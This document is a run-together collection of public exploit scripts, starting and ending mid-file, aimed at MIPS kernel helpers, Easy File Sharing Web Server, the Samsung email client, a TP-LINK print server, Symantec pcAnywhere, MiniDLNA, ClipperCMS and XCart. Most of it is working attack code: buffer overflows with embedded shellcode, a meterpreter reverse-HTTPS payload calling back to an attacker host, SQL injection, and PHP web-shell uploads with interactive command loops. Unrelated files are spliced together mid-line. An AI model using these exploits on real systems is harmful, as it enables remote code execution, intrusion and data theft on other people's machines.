	0x00802821, # move	a1,a0
	0x2404008c, # li	a0, argv0
	0x00972021, # addu	a0,a0,s7
	0x24060078, # li	a2, envp
	0x00d73021, # addu	a2,a2,s7
	0x24070020, # li	a3,32

	0x3c190000, # [20] lui	t9,call_usermodehelper_setup@hi
	0x37390000, # [21] ori	t9,t9,call_usermodehelper_setup@lo

	# call_usermodehelper_setup(argv[0], argv, envp, GPF_ATOMIC)
	0x0320f809, # jalr	t9
	0x00000000, # nop
	0x00402021, # move	a0,v0
	0x24050002, # li	a1,2
	0x3c190000, # [26] lui	t9,call_usermodehelper_exec@hi
	0x37390000, # [27] ori	t9,t9,call_usermodehelper_exec@lo

	# call_usermodehelper_exec(retval, UHM_WAIT_PROC)
	0x0320f809, # jalr	t9
	0x00000000, # nop

	# envp ptr
	0x00000000,

	# argv ptrs
	0x00000000,
	0x00000000,
	0x00000000,
	0x00000000
]

usermodehelper_setup = target['gadgets']['call_usermodehelper_setup']
usermodehelper_exec = target['gadgets']['call_usermodehelper_exec']

# patch call_usermodehelper_setup into kernel shellcode
kernel_shellcode[20] = kernel_shellcode[20] | (usermodehelper_setup>>16)
kernel_shellcode[21] = kernel_shellcode[21] | (usermodehelper_setup&0xffff)

# patch call_usermodehelper_setup into kernel shellcode
kernel_shellcode[26] = kernel_shellcode[26] | (usermodehelper_exec>>16)
kernel_shellcode[27] = kernel_shellcode[27] | (usermodehelper_exec&0xffff)

payload = ""

for w in kernel_shellcode:
	payload += u32(w)

payload += "/bin/sh\x00"
payload += "-c\x00"
payload += cmd

# and now for the moneyshot
s.send(payload)

print "[~] KABOOM! Have a nice day."#!/usr/bin/env python
# Easy File Sharing Web Server v7.2 Remote SEH Based Overflow
# The buffer overwrites ebx with 750+ offset, when sending 4059 it overwrites the EBX
# vulnerable file /changeuser.ghp > Cookies UserID=[buf]
# Means there are two ways to exploit changeuser.ghp
# Tested on Win7 x64 and x86, it should work on win8/win10
# By Audit0r
# https://twitter.com/Audit0rSA


import sys, socket, struct
 

if len(sys.argv) <= 1:
    print "Usage: python efsws.py [host] [port]"
    exit()
 
host = sys.argv[1]    
port = int(sys.argv[2])


# https://code.google.com/p/win-exec-calc-shellcode/
shellcode = (

"\xd9\xcb\xbe\xb9\x23\x67\x31\xd9\x74\x24\xf4\x5a\x29\xc9" +

"\xb1\x13\x31\x72\x19\x83\xc2\x04\x03\x72\x15\x5b\xd6\x56" +

"\xe3\xc9\x71\xfa\x62\x81\xe2\x75\x82\x0b\xb3\xe1\xc0\xd9" +

"\x0b\x61\xa0\x11\xe7\x03\x41\x84\x7c\xdb\xd2\xa8\x9a\x97" +

"\xba\x68\x10\xfb\x5b\xe8\xad\x70\x7b\x28\xb3\x86\x08\x64" +

"\xac\x52\x0e\x8d\xdd\x2d\x3c\x3c\xa0\xfc\xbc\x82\x23\xa8" +

"\xd7\x94\x6e\x23\xd9\xe3\x05\xd4\x05\xf2\x1b\xe9\x09\x5a" +

"\x1c\x39\xbd"

)

print "[+]Connecting to" + host


craftedreq =  "A"*4059

craftedreq += "\xeb\x06\x90\x90"     		 # basic SEH jump

craftedreq += struct.pack("<I", 0x10017743)      # pop commands from ImageLoad.dll                         

craftedreq += "\x90"*40                          # NOPer

craftedreq += shellcode                         

craftedreq += "C"*50                             # filler



httpreq = (

"GET /changeuser.ghp HTTP/1.1\r\n"

"User-Agent: Mozilla/4.0\r\n"

"Host:" + host + ":" + str(port) + "\r\n"

"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"

"Accept-Language: en-us\r\n"

"Accept-Encoding: gzip, deflate\r\n"

"Referer: http://" + host + "/\r\n"

"Cookie: SESSIONID=6771; UserID=" + craftedreq + "; PassWD=;\r\n"

"Conection: Keep-Alive\r\n\r\n"
)


print "[+]Sending the Calc...."

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host, port))

s.send(httpreq)

s.close()
# Source: https://code.google.com/p/google-security-research/issues/detail?id=494

'''
The default Samsung email client's email viewer and composer (implemented in SecEmailUI.apk) doesn't sanitize HTML email content for scripts before rendering the data inside a WebView. This allows an attacker to execute arbitrary JavaScript when a user views a HTML email which contains HTML script tags or other events.

At the very least the JavaScript could exploit the attack surface provided within the WebView control. It might also be possible to access local file content or emails depending on the full configuration of the WebView, although this hasn't been tested fully. 

This can also be exploited locally with the com.samsung.android.email.intent.action.QUICK_REPLY_BACKGROUND intent which will include attacker controlled HTML in the sending email. If the final message was viewed it would be possible for the script to extract the original message from the Document object and potentially post that information to another server.

Attached is a simple SMTP client in Python to send an HTML message with script contents to the device. The "me", "you", "me_password" and "smtp_server" variables need to be changed to ones appropriate for the sending email account and the receiving account on the phone. When the resulting email is viewed it should display the URL of the page which is of the form email://M/N where M is the email account ID and N is the message ID which proves that the script code executed.
'''

#!/usr/bin/env python

import smtplib

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# Change the details here appropriate to your configuration
me = "attacker@gmail.com"
me_password = "THIS IS NOT REAL"
you = "project.zero.test@gmail.com"
smtp_server = "smtp.gmail.com"

msg = MIMEMultipart('alternative')
msg['Subject'] = "Hello There!"
msg['From'] = me
msg['To'] = you

text = "Hello There!"
html = """\
<html>
  <head></head>
  <body>
   <p>
       <script>try { document.write(document.location); } catch(e) { document.write(e.message); }</script>
    </p>
  </body>
</html>
"""

part1 = MIMEText(text, 'plain')
part2 = MIMEText(html, 'html')

msg.attach(part1)
msg.attach(part2)

s = smtplib.SMTP_SSL(smtp_server)
s.login(me, me_password)
s.sendmail(me, you, msg.as_string())
s.quit()
source: http://www.securityfocus.com/bid/60682/info

TP-LINK TL-PS110U Print Server is prone to a security-bypass vulnerability.

Attackers can exploit this issue to bypass certain security restrictions and obtain sensitive information which may aid in further attacks.
http://drupal.org/node/207891 

import telnetlib
import sys
host = sys.argv[1]
tn = telnetlib.Telnet(host)
tn.read_until("Password:")
tn.write("\r\n")
tn.read_until("choice")
tn.write("1\r\n")
tn.read_until("choice")
tn.write("1\r\n")
data = tn.read_until("choice")
for i in data.split("\r\n"):
    if "Device Name" in i:
        print i.strip()
    if "Node ID" in i:
        print i.strip()
tn.write("0\r\n")
tn.read_until("choice")
tn.write("2\r\n")
data = tn.read_until("choice")
for i in data.split("\r\n"):
    if "Manufacture:" in i:
        print i.strip()
    if "Model:" in i:
        print i.strip()
tn.write("0\r\n")
tn.read_until("choice")
tn.write("5\r\n")
data = tn.read_until("choice")
for i in data.split("\r\n"):
    if "Community" in i:
        print i.strip()
#!/usr/bin/python

################################################################
# Exploit Title: Symantec pcAnywhere v12.5.0 Windows x86 RCE
# Date: 2015-10-31
# Exploit Author: Tomislav Paskalev
# Vendor Homepage: https://www.symantec.com/
# Software Link: http://esdownload.symantec.com/akdlm/CD/MTV/pcAnywhere_12_5_MarketingTrialware.exe
#   Version: Symantec pcAnywhere v12.5.0 Build 442 (Trial)
# Vulnerable Software:
#   Symantec pcAnywhere 12.5.x through 12.5.3
#   Symantec IT Management Suite pcAnywhere Solution 7.0 (aka 12.5.x) and 7.1 (aka 12.6.x)
# Tested on:
#   Symantec pcAnywhere v12.5.0 Build 442 (Trial)
#   --------------------------------------------
#   Microsoft Windows Vista Ultimate SP1 x86 EN
#   Microsoft Windows Vista Ultimate SP2 x86 EN
#   Microsoft Windows 2008 Enterprise SP2 x86 EN
#   Microsoft Windows 7 Professional SP1 x86 EN
#   Microsoft Windows 7 Ultimate SP1 x86 EN
# CVE ID: 2011-3478
# OSVDB-ID: 78532
################################################################
# Vulnerability description:
#   The application's module used for handling incoming connections
#   (awhost32.exe) contains a flaw. When handling authentication
#   requests, the vulnerable process copies user provided input
#   to a fixed length buffer without performing a length check.
#   A remote unauthenticated attacker can exploit this vulnerability
#   to cause a buffer overflow and execute arbitrary code in the
#   context of the exploited application (installed as a service
#   by default, i.e. with "NT AUTHORITY\SYSTEM" privileges).
################################################################
# Target application notes:
#   - the application processes one login attempt at a time
#     (i.e. multiple parallel login requests are not possible)
#   - available modules (interesting exploit wise):
#     Name         | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll
#    -------------------------------------------------------------
#     awhost32.exe | False  | False   | False |  False   | False
#     ijl20.dll    | False  | False   | False |  False   | False
#     IMPLODE.DLL  | False  | False   | False |  False   | False
#    -------------------------------------------------------------
#   - supported Windows x86 operating systems (pcAnywhere v12.5)
#       - Windows 2000
#       - Windows 2003 Server
#       - Windows 2008 Server
#       - Windows XP
#       - Windows Vista
#       - Windows 7
################################################################
# Exploit notes:
#   - bad characters: "\x00"
#   - Windows Vista, Windows 2008 Server, Windows 7
#     - after a shellcode execution event occurs, the
#       application does not crash and remains fully functional
#       - one successful shellcode execution event has a low
#         success rate (applies to all OSes)
#         - in order to achieve an overall more reliable exploit,
#           multiple shellcode executions need to be performed
#           (until the shellcode is successfully executed)
#           - brute force is a feasible method 
#             - multiple parallel brute force attacks are not possible
#   - multiple valid offsets are available (i.e. not just the
#     ones tested)
################################################################
# Test notes:
#   - all tested OSes
#     - clean default installations
#   - all OS specific statistics referenced in the exploit are
#     based on the test results of 10 attempts per tested offset
#     - all attempts were performed after a system reboot (VM)
#     - the provided test results should be taken only as a rough guide
#       - in practice it might occur that the number of attempts
#         needed to achieve successful exploitation is (much)
#         higher than the maximum value contained in the test
#         results, or that the exploit does not succeed at all
#         - other (untested) offsets might provide better results
#   - not letting the OS and application load fully/properly before
#     starting the exploit may lead to failed exploitation (this
#     observation was made during the testing of the exploit and
#     applies mostly to Windows 7)
################################################################
# Patch:
#   https://support.symantec.com/en_US/article.TECH179526.html
#   https://support.norton.com/sp/en/us/home/current/solutions/v78694006_EndUserProfile_en_us
################################################################
# Thanks to:
#   Tal zeltzer (discovered the vulnerability)
#   S2 Crew (Python PoC)
################################################################
# In memoriam:
#   msfpayload | msfencode  [2005 - 2015]
################################################################
# References:
#   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3478
#   http://www.zerodayinitiative.com/advisories/ZDI-12-018/
#   https://www.exploit-db.com/exploits/19407/
################################################################


import socket
import time
import struct
import string
import sys




################################
###  HARDCODED TARGET INFO   ###
################################


# target server info
# >>> MODIFY THIS >>>
targetServer = "192.168.80.227"
targetPort   = 5631


# Supported operating systems
vistaUltSP1  = {
    'Version': 'Microsoft Windows Vista Ultimate SP1 x86 EN',
    'Offset': 0x03e60000,
    'PasswordStringLength': 3500,
    'TestAttempts': [8, 62, 35, 13, 8, 7, 11, 23, 8, 10]
};
vistaUltSP2  = {
    'Version': 'Microsoft Windows Vista Ultimate SP2 x86 EN',
    'Offset': 0x03e60000,
    'PasswordStringLength': 3500,
    'TestAttempts': [16, 27, 13, 17, 4, 13, 7, 9, 5, 16]
};
s2k8EntSP2   = {
    'Version': 'Microsoft Windows 2008 Enterprise SP2 x86 EN',
    'Offset': 0x03dd0000,
    'PasswordStringLength': 3500,
    'TestAttempts': [25, 5, 14, 18, 66, 7, 8, 4, 4, 24]
};
sevenProSP1  = {
    'Version': 'Microsoft Windows 7 Professional SP1 x86 EN',
    'Offset': 0x03a70000,
    'PasswordStringLength': 3500,
    'TestAttempts': [188, 65, 25, 191, 268, 61, 127, 136, 18, 98]
};
sevenUltSP1  = {
    'Version': 'Microsoft Windows 7 Ultimate SP1 x86 EN',
    'Offset': 0x03fa0000,
    'PasswordStringLength': 3500,
    'TestAttempts': [23, 49, 98, 28, 4, 31, 4, 42, 50, 42]
};


# target server OS
# >>> MODIFY THIS >>>
#OSdictionary = vistaUltSP1
#OSdictionary = vistaUltSP2
#OSdictionary = s2k8EntSP2
#OSdictionary = sevenProSP1
OSdictionary = sevenUltSP1


# timeout values
shellcodeExecutionTimeout = 30


# client-server handshake
initialisationSequence = "\x00\x00\x00\x00"
handshakeSequence      = "\x0d\x06\xfe"


# username string
usernameString         = "U" * 175


# shellcode
# available shellcode space: 1289 bytes
# shellcode generated with Metasploit Framework Version: 4.11.4-2015090201 (Kali 2.0)
# msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_https LHOST=192.168.80.223 LPORT=443 EXITFUNC=seh -e x86/shikata_ga_nai -b '\x00' -f python -v shellcode
# >>> MODIFY THIS >>>
shellcode =  ""
shellcode += "\xda\xd3\xd9\x74\x24\xf4\xbf\x2c\x46\x39\x97\x5d"
shellcode += "\x33\xc9\xb1\x87\x83\xed\xfc\x31\x7d\x14\x03\x7d"
shellcode += "\x38\xa4\xcc\x6b\xa8\xaa\x2f\x94\x28\xcb\xa6\x71"
shellcode += "\x19\xcb\xdd\xf2\x09\xfb\x96\x57\xa5\x70\xfa\x43"
shellcode += "\x3e\xf4\xd3\x64\xf7\xb3\x05\x4a\x08\xef\x76\xcd"
shellcode += "\x8a\xf2\xaa\x2d\xb3\x3c\xbf\x2c\xf4\x21\x32\x7c"
shellcode += "\xad\x2e\xe1\x91\xda\x7b\x3a\x19\x90\x6a\x3a\xfe"
shellcode += "\x60\x8c\x6b\x51\xfb\xd7\xab\x53\x28\x6c\xe2\x4b"
shellcode += "\x2d\x49\xbc\xe0\x85\x25\x3f\x21\xd4\xc6\xec\x0c"
shellcode += "\xd9\x34\xec\x49\xdd\xa6\x9b\xa3\x1e\x5a\x9c\x77"
shellcode += "\x5d\x80\x29\x6c\xc5\x43\x89\x48\xf4\x80\x4c\x1a"
shellcode += "\xfa\x6d\x1a\x44\x1e\x73\xcf\xfe\x1a\xf8\xee\xd0"
shellcode += "\xab\xba\xd4\xf4\xf0\x19\x74\xac\x5c\xcf\x89\xae"
shellcode += "\x3f\xb0\x2f\xa4\xad\xa5\x5d\xe7\xb9\x57\x3b\x6c"
shellcode += "\x39\xc0\xb4\xe5\x57\x79\x6f\x9e\xeb\x0e\xa9\x59"
shellcode += "\x0c\x25\x84\xbe\xa1\x95\xb4\x13\x16\x72\x01\xc2"
shellcode += "\xe1\x25\x8a\x3f\x42\x79\x1f\xc3\x37\x2e\xb7\x78"
shellcode += "\xb6\xd0\x47\x97\x86\xd1\x47\x67\xd9\x84\x3f\x54"
shellcode += "\x6e\x11\x95\xaa\x3a\x37\x6f\xa8\xf7\xbe\xf8\x1d"
shellcode += "\x4c\x16\x73\x50\x25\xc2\x0c\xa6\x91\xc1\xb0\x8b"
shellcode += "\x53\x69\x76\x22\xd9\x46\x0a\x1a\xbc\xea\x87\xf9"
shellcode += "\x09\xb2\x10\xcf\x14\x3c\xd0\x56\xb3\xc8\xba\xe0"
shellcode += "\x69\x5a\x3a\xa2\xff\xf0\xf2\x73\x92\x4b\x79\x10"
shellcode += "\x02\x3f\x4f\xdc\x8f\xdb\xe7\x4f\x6d\x1d\xa9\x1d"
shellcode += "\x42\x0c\x70\x80\xcc\xe9\xe5\x0a\x55\x80\x8a\xc2"
shellcode += "\x3d\x2a\x2f\xa5\xe2\xf1\xfe\x7d\x2a\x86\x6b\x08"
shellcode += "\x27\x33\x2a\xbb\xbf\xf9\xd9\x7a\x7d\x87\x4f\x10"
shellcode += "\xed\x0d\x1b\xad\x88\xc6\xb8\x50\x07\x6a\x74\xf1"
shellcode += "\xd3\x2d\xd9\x84\x4e\xc0\x8e\x25\x23\x76\x60\xc9"
shellcode += "\xb4\xd9\xf5\x64\x0e\x8e\xa6\x22\x05\x39\x3f\x98"
shellcode += "\x96\x8e\xca\x4f\x79\x54\x64\x26\x33\x3d\xe7\xaa"
shellcode += "\xa2\xb1\x90\x59\x4b\x74\x1a\xce\xf9\x0a\xc6\xd8"
shellcode += "\xcc\x99\x49\x75\x47\x33\x0e\x1c\xd5\xf9\xde\xad"
shellcode += "\xa3\x8c\x1e\x02\x3b\x38\x96\x3d\x7d\x39\x7d\xc8"
shellcode += "\x47\x95\x16\xcb\x75\xfa\x63\x98\x2a\xa9\x3c\x4c"
shellcode += "\x9a\x25\x28\x27\x0c\x8d\x51\x1d\xc6\x9b\xa7\xc1"
shellcode += "\x8e\xdb\x8b\xfd\x4e\x55\x0b\x97\x4a\x35\xa6\x77"
shellcode += "\x04\xdd\x43\xce\x36\x9b\x53\x1b\x15\xf7\xf8\xf7"
shellcode += "\xcf\x9f\xd3\xf1\xf7\x24\xd3\x2b\x82\x1b\x5e\xdc"
shellcode += "\xc3\xee\x78\x34\x90\x10\x7b\xc5\x4c\x51\x13\xc5"
shellcode += "\x80\x51\xe3\xad\xa0\x51\xa3\x2d\xf3\x39\x7b\x8a"
shellcode += "\xa0\x5c\x84\x07\xd5\xcc\x28\x21\x3e\xa5\xa6\x31"
shellcode += "\xe0\x4a\x37\x61\xb6\x22\x25\x13\xbf\x51\xb6\xce"
shellcode += "\x3a\x55\x3d\x3e\xcf\x51\xbf\x03\x4a\x9d\xca\x66"
shellcode += "\x0c\xdd\x6a\x81\xdb\x1e\x6b\xae\x12\xd8\xa6\x7f"
shellcode += "\x65\x2c\xff\x51\xbd\x60\xd1\x9f\x8f\xb3\x2d\x5b"
shellcode += "\x11\xbd\x1f\x71\x87\xc2\x0c\x7a\x82\xa9\xb2\x47"




################################
###     BUFFER OVERFLOW      ###
###   STRING CONSTRUCTION    ###
################################


# Calculate address values based on the OS offset
pointerLocationAddress    = OSdictionary['Offset'] + 0x00005ad8
pointerForECXplus8Address = OSdictionary['Offset'] + 0x00005ad4
breakPointAddress         = OSdictionary['Offset'] + 0x000065af - 0x00010000


# jump over the next 38 bytes (to the begining of the shellcode)
jumpToShellcode    = "\xeb\x26\x90\x90"

# pointerLocationAddress - the memory address location of the "pointerForECXplus8" variable
pointerLocation    = struct.pack('<L', pointerLocationAddress)

# CALL ESI from the application module ijl20.dll [aslr=false,rebase=false,safeseh=false]
callESI            = struct.pack('<L', 0x67f7ab23)

# pointerForECXplus8Address - the memory address location of the start of the DDDD string in the shellcode (Offset + 0x00005acc + 0x8)
pointerForECXplus8 = struct.pack('<L', pointerForECXplus8Address)


# construct the password string which will cause a buffer overflow condition and exploit the vulnerability
passwordString = (
    "A" * 945 +
    jumpToShellcode +
    pointerLocation +
    "D" * 4 +
    pointerForECXplus8 +
    callESI +
    "\x90" * 20 +
    shellcode +
    "I" * (1289 - len(shellcode)) +
    "\xaa" * (OSdictionary['PasswordStringLength'] - 945 - 4 * 5 - 20 - 1289)
)




################################
###        FUNCTIONS         ###
################################


# calculate and return the median value of the argument list
def calculateMedian(targetList):
    sortedTargetList = sorted(targetList)
    targetListLength = len(targetList)
    medianIndex = (targetListLength - 1) / 2

    if (targetListLength % 2):
        return sortedTargetList[medianIndex]
    else:
        return ((sortedTargetList[medianIndex] + sortedTargetList[medianIndex + 1]) / 2)



# print an indented line with a type prefix
def printLine(infoType, indentDepth, textToDisplay):

    # [I]nformational
    if infoType == "I":
        print ('    ' * indentDepth),
        print "\033[1;37m[*]\033[1;m", textToDisplay

    # [E]rror
    elif infoType == "E":
        print ('    ' * indentDepth),
        print "\033[1;31m[-]\033[1;m", textToDisplay

    # [S]uccess
    elif infoType == "S":
        print ('    ' * indentDepth),
        print "\033[1;32m[+]\033[1;m", textToDisplay

    # [W]arning
    elif infoType == "W":
        print ('    ' * indentDepth),
        print "\033[1;33m[!]\033[1;m", textToDisplay

    # [N]one
    elif infoType == "N":
        print ('    ' * indentDepth),
        print textToDisplay



# print the banner - general exploit info, target info, target OS statistics
def printBanner():
    printLine ("I", 0, "Symantec pcAnywhere v12.5.0 Build 442 Login+Password field")
    printLine ("N", 1, "Buffer Overflow Remote Code Execution exploit (CVE-2011-3478)")
    printLine ("I", 1, "by Tomislav Paskalev")

    printLine ("I", 0, "Target server information")
    printLine ("I", 1, "IP address            : " + targetServer)
    printLine ("I", 1, "Port                  : " + str(targetPort))

    printLine ("I", 0, "Exploit target information")
    printLine ("I", 1, "Target OS             : " + OSdictionary['Version'])
    printLine ("I", 2, "Offset            : " + "{:#010x}".format(OSdictionary['Offset']))
    printLine ("I", 2, "Breakpoint (test) : " + "{:#010x}".format(breakPointAddress))
    printLine ("I", 2, "Password length   : " + str(OSdictionary['PasswordStringLength']))
    printLine ("I", 2, "Test result stats")
    printLine ("I", 3, "Test count    : " + str(len(OSdictionary['TestAttempts'])))
    printLine ("I", 3, "Reliability   : " + str(((len(OSdictionary['TestAttempts']) - OSdictionary['TestAttempts'].count(0)) * 100) / len(OSdictionary['TestAttempts'])) + "%")
    printLine ("I", 3, "Min attempt   : " + str(min([element for element in OSdictionary['TestAttempts'] if element > 0])))
    printLine ("I", 3, "Max attempt   : " + str(max(OSdictionary['TestAttempts'])))
    printLine ("I", 3, "Avg attempt   : " + str(sum(OSdictionary['TestAttempts']) / len(OSdictionary['TestAttempts'])))
    printLine ("I", 3, "Median attempt: " + str(calculateMedian(OSdictionary['TestAttempts'])))



# connect to the server and return the socket
def connectToServer(server, port):
    # create socket
    targetSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        targetSocket.connect((server, port))
    except socket.error as msg:
        if "[Errno 111] Connection refused" in str(msg):
            return None
    # return the opened socket
    return targetSocket



# send the data to the server and return the response
def sendDataToServer(destSocket, dataToSend):
    destSocket.send(dataToSend)
    try:
        receivedData = destSocket.recv(1024)
    except socket.error as msg:
        if "[Errno 104] Connection reset by peer" in str(msg):
            return None
    return receivedData



# run the exploit; exits when finished or interrupted
def runExploit():
    printLine ("I", 0, "Starting exploit...")

    attemptCounter = 0

    # brute force the service until the shellcode is successfully executed
    while True:
        # connect to the target server
        openSocket = connectToServer(targetServer, targetPort)

        attemptCounter += 1
        sleepTimer = 0

        printLine ("I", 1, "Attempt no. " + str(attemptCounter))
        printLine ("I", 2, "Sending initialisation sequence...")

        # send the data; check outcome
        while True:
            receivedData = sendDataToServer(openSocket, initialisationSequence)
            # check if server responded properly, if yes exit the loop
            if receivedData:
                if "Please press <Enter>..." in receivedData:
                    break
            # exit if the service is unavailable
            if attemptCounter == 1:
                printLine ("E", 3, "Service unavailable")
                printLine ("I", 4, "Exiting...")
                exit(1)
            # check if shellcode executed (based on a timer)
            if sleepTimer > shellcodeExecutionTimeout:
                print ""
                printLine ("S", 4, "Shellcode executed after " + str(attemptCounter - 1) + " attempts")
                printLine ("I", 5, "Exiting...")
                exit(1)

            # print waiting ticks
            sys.stdout.write('\r')
            sys.stdout.write("             \033[1;33m[!]\033[1;m Connection reset - reinitialising%s" % ('.' * sleepTimer))
            sys.stdout.flush()

            # sleep one second and reconnect
            time.sleep(1)
            sleepTimer += 1

            openSocket.close()
            openSocket = connectToServer(targetServer, targetPort)

        if sleepTimer > 0:
            print ""

        printLine ("I", 2, "Sending handshake sequence...")
        openSocket.send(handshakeSequence)
        time.sleep(3)
        data = openSocket.recv(1024)
 
        printLine ("I", 2, "Sending username...")
        openSocket.send(usernameString)
        time.sleep(3)
 
        printLine ("I", 2, "Sending password...")
        openSocket.send(passwordString)
        openSocket.close()
        time.sleep(3)



# main function
if __name__ == "__main__":
    printBanner()
    try:
        runExploit()
    except KeyboardInterrupt:
        print ""
        sys.exit()


# End of file
source: http://www.securityfocus.com/bid/61282/info

ReadyMedia is prone to a remote heap-based buffer-overflow vulnerability.

Attackers can exploit this issue to execute arbitrary code within the context of the affected application. Failed exploit attempts will result in a denial-of-service condition.

ReadyMedia prior to 1.1.0 are vulnerable. 

#!/usr/bin/env python
#AAAAinject.py
# Author: Zachary Cutlip
# zcutlip@tacnetsol.com
# twitter: @zcutlip
#This script injects a buffer overflow into the ALBUM_ART table of
#MiniDLNA's SQLite database. When queried with the proper soap request,
#this buffer overflow demonstrates arbitrary code execution by placing a 
#string of user-controlled 'A's in the CPU's program counter. This
#affects MiniDLNA version 1.0.18 as shipped with Netgear WNDR3700 version 3.
import math
import sys
import urllib,socket,os,httplib
import time
from overflow_data import DlnaOverflowBuilder
headers={"Host":"10.10.10.1"}
host="10.10.10.1"
COUNT=8
LEN=128
empty=''
overflow_strings=[]
overflow_strings.append("AA")
overflow_strings.append("A"*LEN)
overflow_strings.append("B"*LEN)
overflow_strings.append("C"*LEN)
overflow_strings.append("D"*LEN)
overflow_strings.append("A"*LEN)
overflow_strings.append("\x10\x21\x76\x15"*(LEN/4))
overflow_strings.append("\x10\x21\x76\x15"*(LEN/4))
overflow_strings.append("D"*LEN)
overflow_strings.append("D"*LEN)
overflow_strings.append("D"*LEN)
path_beginning='/AlbumArt/1;'
path_ending='-18.jpg'
details_insert_query='insert/**/into/**/DETAILS(ID,SIZE,TITLE,ARTIST,ALBUM'+\
',TRACK,DLNA_PN,MIME,ALBUM_ART,DISC)/**/VALUES("31337"'+\
',"PWNED","PWNED","PWNED","PWNED","PWNED","PWNED"'+\
',"PWNED","1","PWNED");'
objects_insert_query='insert/**/into/**/OBJECTS(OBJECT_ID,PARENT_ID,CLASS,DETAIL_ID)'+\
'/**/VALUES("PWNED","PWNED","container","31337");'
details_delete_query='delete/**/from/**/DETAILS/**/where/**/ID="31337";'
objects_delete_query='delete/**/from/**/OBJECTS/**/where/**/OBJECT_ID="PWNED";'
def build_injection_req(query):
 request=path_beginning+query+path_ending
return request
def do_get_request(request):
 conn=httplib.HTTPConnection(host,8200)
 conn.request("GET",request,"",headers)
 conn.close()
def build_update_query(string):
 details_update_query='update/**/DETAILS/**/set/**/ALBUM_ART=ALBUM_ART'+\
'||"'+string+'"/**/where/**/ID="31337";'
return details_update_query
def clear_overflow_data():
print "Deleting existing overflow data..."
 request=build_injection_req(details_delete_query)
 do_get_request(request)
 request=build_injection_req(objects_delete_query)
 do_get_request(request)
 time.sleep(1)

def insert_overflow_data():
print("Setting up initial database records....")
 request=build_injection_req(objects_insert_query)
 do_get_request(request)
 request=build_injection_req(details_insert_query)
 do_get_request(request)
print("Building long ALBUM_ART string.")
for string in overflow_strings:
 req=build_injection_req(build_update_query(string))
 do_get_request(req)
clear_overflow_data()
insert_overflow_data()
#!/usr/local/bin/python
# Exploit for ClipperCMS 1.3.0 Code Execution vulnerability
# An account is required with rights to file upload (eg a user in the Admin, Publisher, or Editor role)
# The server must parse htaccess files for this exploit to work.
# Curesec GmbH crt@curesec.com

import sys
import re
import requests # requires requests lib

if len(sys.argv) != 4:
    exit("usage: python " + sys.argv[0] + " http://example.com/ClipperCMS/ admin admin")

url = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]

loginPath = "/manager/processors/login.processor.php"
fileManagerPath = "/manager/index.php?a=31"

def login(requestSession, url, username, password):
    postData = {"ajax": "1", "username": username, "password": password}
    return requestSession.post(url, data = postData, headers = {"referer": url})

def getFullPath(requestSession, url):
    request = requestSession.get(url, headers = {"referer": url})
    if "You don't have enough privileges" in request.text:
        return "cant upload"
    fullPath = re.search("var current_path = '(.*)';", request.text)
    return fullPath.group(1)

def upload(requestSession, url, fileName, fileContent, postData):
    filesData = {"userfile[0]": (fileName, fileContent)}
    return requestSession.post(url, files = filesData, data = postData, headers = {"referer": url})

def workingShell(url, fullPath):
    return fullPath.strip("/") in requests.get(url + "pwd", headers = {"referer": url}).text.strip("/")

def runShell(url):
    print("enter command, or enter exit to quit.")
    command = raw_input("$ ")
    while "exit" not in command:
        print(requests.get(url + command).text)
        command = raw_input("$ ")

requestSession = requests.session()

loginResult = login(requestSession, url + loginPath, username, password)
if "Incorrect username" in loginResult.text:
    exit("ERROR: Incorrect username or password")
else:
    print("successful: login as " + username)

fullPath = getFullPath(requestSession, url + fileManagerPath)
if fullPath == "cant upload":
    exit("ERROR: user does not have required privileges")
else:
    print("successful: user is allowed to use file manager. Full path: " + fullPath)

uploadResult = upload(requestSession, url + fileManagerPath, ".htaccess", "AddType application/x-httpd-php .png", {"path": fullPath})
if "File uploaded successfully" not in uploadResult.text:
    exit("ERROR: could not upload .htaccess file")
else:
    print("successful: .htaccess upload")

uploadResult = upload(requestSession, url + fileManagerPath, "404.png", "<?php passthru($_GET['x']) ?>", {"path": fullPath})
if "File uploaded successfully" not in uploadResult.text:
    exit("ERROR: could not upload shell")
else:
    print("successful: shell upload. Execute commands via " + url + "404.png?x=<COMMAND>")

if workingShell(url + "404.png?x=", fullPath):
    print("successful: shell seems to be working")
else:
    exit("ERROR: shell does not seem to be working correctly")

runShell(url + "404.png?x=")


#Blog Reference:
#http://blog.curesec.com/article/blog/ClipperCMS-130-Code-Execution-Exploit-96.html#!/usr/local/bin/python
# Exploit for XCart 5.2.6 Code Execution vulnerability
# An admin account is required to use this exploit
# Curesec GmbH

import sys
import re
import requests # requires requests lib

if len(sys.argv) != 4:
    exit("usage: python " + sys.argv[0] + " http://example.com/xcart/ admin@example.com admin")

url = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]

loginPath = "/admin.php?target=login"
fileManagerPath = "/admin.php?target=logo_favicon"

shellFileName = "404.php"
shellContent = "GIF89a;<?php passthru($_GET['x']); ?>"

def login(requestSession, url, username, password):
    csrfRequest = requestSession.get(url)
    csrfTokenRegEx = re.search('name="xcart_form_id" type="hidden" value="(.*)" class', csrfRequest.text)
    csrfToken = csrfTokenRegEx.group(1)

    postData = {"target": "login", "action": "login", "xcart_form_id": csrfToken, "login": username, "password": password}
    loginResult = requestSession.post(url, data = postData).text
    return "Invalid login or password" not in loginResult

def upload(requestSession, url, fileName, fileContent):
    csrfRequest = requestSession.get(url)
    csrfTokenRegEx = re.search('SimpleCMS" />\n<input  type="hidden" name="xcart_form_id" value="(.*)" />', csrfRequest.text)
    csrfToken = csrfTokenRegEx.group(1)

    filesData = {"logo": (fileName, fileContent)}
    postData = {"target": "logo_favicon", "action": "update", "page": "CDev\SimpleCMS", "xcart_form_id": csrfToken}
    uploadResult = requestSession.post(url, files = filesData, data = postData)
    return "The data has been saved successfully" in uploadResult.text

def runShell(url):
    print("enter command, or enter exit to quit.")
    command = raw_input("$ ")
    while "exit" not in command:
        print(requests.get(url + command).text.replace("GIF89a;", ""))
        command = raw_input("$ ")


requestSession = requests.session()

if login(requestSession, url + loginPath, username, password):
    print("successful: login")
else:
